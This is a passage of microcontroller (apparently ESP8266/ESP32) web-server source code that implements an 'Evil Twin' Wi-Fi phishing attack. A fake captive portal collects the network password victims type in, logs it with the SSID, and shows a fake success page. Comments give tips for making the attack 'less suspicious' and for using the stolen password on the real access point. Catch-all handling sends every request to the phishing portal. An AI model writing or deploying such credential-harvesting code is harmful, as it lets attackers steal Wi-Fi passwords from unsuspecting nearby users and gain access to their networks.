}

void handleCaptivePortalSubmit() {
  if (webServer.hasArg("password")) {
    _tryPassword = webServer.arg("password");
    String logEntry = "Captured for SSID: " + _selectedNetwork.ssid + ", Password: " + _tryPassword + " (Time: " + String(millis() / 1000) + "s)\n";
    _correctPasswordLog += logEntry;
    Serial.print("[SNIFFER] ");
    Serial.println(logEntry);

    // After capturing, you can redirect them to a "success" page or a fake error page
    // or even try to connect to the real AP (if you want to be less suspicious).
    // For now, a simple "Thank You" page.
    String response = "<!DOCTYPE html><html><head><title>Success</title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>";
    response += "<center><h1>Thank You!</h1><p>Your connection is being established. Please wait...</p>";
    response += "<p>You may need to reconnect to the network.</p></center></body></html>";
    webServer.send(200, "text/html", response);

    // Optional: Try to connect to the real AP with the captured password
    // This makes the attack more convincing but requires the ESP to switch roles.
    // WiFi.disconnect();
    // WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
    // Serial.println("[INFO] Attempting to connect to real AP with captured password...");
  } else {
    webServer.send(200, "text/html", "Password not provided.");
  }
}

void handleRestart() {
  webServer.send(200, "text/html", getHeader("Restarting") + "<h2>Restarting Device...</h2><p>The device will restart in a few seconds. Please wait.</p>" + getFooter());
  delay(2000);
  ESP.restart();
}

void handleNotFound() {
  // If Evil Twin is active, redirect all requests to the captive portal
  if (hotspot_active) {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/generate_captive_portal", true);
    webServer.send(302, "text/plain", "");
  } else {
    // Otherwise, serve a standard 404 page
    String html = getHeader("404 Not Found");
    html += "<h2>Page Not Found</h2>";
    html += "<p>The requested URL was not found on this server.</p>";
    html += "<p><a href='/admin'>Go to Admin Panel</a></p>";
    html += getFooter();
    webServer.send(404, "text/html", html);
  }
}
